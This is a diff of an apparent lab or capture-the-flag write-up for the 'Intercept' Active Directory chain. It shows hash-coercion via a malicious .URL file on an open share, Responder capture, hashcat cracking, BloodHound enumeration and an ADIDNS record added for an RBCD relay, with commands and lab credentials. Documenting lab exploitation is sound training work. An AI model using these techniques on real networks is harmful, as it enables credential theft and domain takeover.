@@ -12,22 +12,22 @@ Intercept is a hard rated chain which contains two machines WS01 and DC01. The c
 ![_install](/assets/img/VL-Intercept/intercept_slide.png)
 
 ## Initial Access
-Added the following to the /etc/hosts file:
+Starting off I added the following to the /etc/hosts file:
 ```bash
 10.10.185.69 intercept.vl
 10.10.185.69 DC01.intercept.vl
 10.10.185.70 WS01.intercept.vl
 ```
 
-I started off using some nmap scans and quickly noticed  that it was possible to access the dev share using a null session.
-
+I started off with some nmap scans and quickly noticed that it was possible to access the dev share using a null session.
 ![_install](/assets/img/VL-Intercept/null_session_dev.png)
 
-I entered the share using null authentication and looked through the directories.
+Using this null session I entered the "dev" share and looked through the directories for interesting information.
 
 ![_install](/assets/img/VL-Intercept/null_session_dev_2.png)
 
-I noticed that the "readme.txt" file says that the share is checked regulary for updates for the application. This for me was a big indicator for forced authenticated using a file upload. I created a malcious .URL file:
+Something that stood out to me is that there is a readme.txt file which says that the share is checked regulary for updates. This for me immediately triggered "coerced authentication". We can craft a malicious .URL file that triggers an authentication request to our SMB listener when someone accesses the share. We can then attempt to relay or crack the authentication request. Is used to following URL payload:
+
 ```bash
 [InternetShortcut]
 URL=whatever
@@ -39,15 +39,16 @@ And uploaded it to the share using an smbclient session:
 
 ![_install](/assets/img/VL-Intercept/file_upload.png)
 
-Next up is setting up responder with a SMB listener to get the NTLMv2 hash of the Kathryn.Spencer Domain User:
+Next, I set up Responder with an SMB listener to capture the NTLMv2 hash of the Kathryn.Spencer Domain User:
 
 ![_install](/assets/img/VL-Intercept/responder.png)
 
-We can't relay the connection to the Domain Controller before SMB Signing is enabled by default. However I always check this to make sure.
+Sadly I can't relay the connection to the Domain Controller because SMB Signing is enabled. However I always make sure to check this using netexec:
 
 ![_install](/assets/img/VL-Intercept/signing_enabled.png)
 
-So instead of relaying the connection lets try to check it using hashcat. I put the contents of the hash in a file called hash.txt and ran it against rockyout.txt like so:
+Despite SMB Signing being enabled by default on the Domain Controller, which prevents direct connection relaying, I decided to attempt  cracking the hash with hashcat:
+
 ```bash
 hashcat -a 0 -m 5600 hash.txt /opt/rockyou.txt
 ```
@@ -55,26 +56,29 @@ This succesfully recovered the password which ended up being "Choclate1".
 ![_install](/assets/img/VL-Intercept/cracked_hash.png)
 
 ## Domain Enumeration
-Now that we have a valid Domain user we can enumerate the domain using bloodhound. Let's run the python remote ingestor to collect some data:
+Now that we have a valid Domain account we can enumerate the domain using bloodhound. Let's run the python remote ingestor to collect some data:
+
 ```bash
 bloodhound.py -d intercept.vl -v --zip -c All -dc DC01.intercept.vl -ns 10.10.185.69 -u 'Kathryn.spencer' -p 'Chocolate1' --dns-timeout 10
 ```
 ![_install](/assets/img/VL-Intercept/bloodhound.png)
 
-The user kathryn.spencer doesn't have any interesting outbound permissions.
+The user Kathryn.Spencer doesn't have any interesting outbound permissions.
+
 ![_install](/assets/img/VL-Intercept/bloodhound_enum.png)
 
 I enumerated the Domain more and figured out that the MachineAccountQuota has the default setting of "10".
 ![_install](/assets/img/VL-Intercept/maq.png)
 
 And also figured out that the Domain Controller doesn't have LDAP Signing enforced:
+
 ![_install](/assets/img/VL-Intercept/ldap_signing.png)
 
 If the WebDAV service is also enabled we can perform an RBCD WebClient attack using coerced authentication such as PetitPotam. Lets check if the WebDAV service is active using netexec:
 ![_install](/assets/img/VL-Intercept/webdav_client.png)
 
 ## RBCD to Local Administrator
-Now that we know that the WebDAV service is enabled on WS01, LDAP Signing is disabled on the DC and we can add machine accounts to the domain we can abuse this in combination with coerced authentcation to escalate privileges. However when relaying out coercion authentication and add RBCD permissions to WS01 the authenticated connection has to come from a trusted intranet zone. Luckly for us by default the "Authenticated Users" group can create child objects on the ADIDNS zone. Lets start off the attack by create a new A-record which points to our machine using dnstool.py:
+Now that we know that the WebDAV service is active on WS01, LDAP Signing is disabled on the DC, and we can add machine accounts to the domain, we can abuse these conditions in combination with coerced authentication to escalate privileges. However, when relaying our coercion and add RBCD permissions to WS01 the authenticated connection has to originate from a trusted intranet zone. Luckly for us by default the "Authenticated Users" group can create child objects on the ADIDNS zone. Lets start off the attack by create a new A-record which points to our machine using dnstool.py:
 ```bash
 dnstool.py -u 'intercept\kathryn.spencer' -p 'Chocolate1' -a add -r kali -d 10.8.0.49 10.10.185.69
 ```
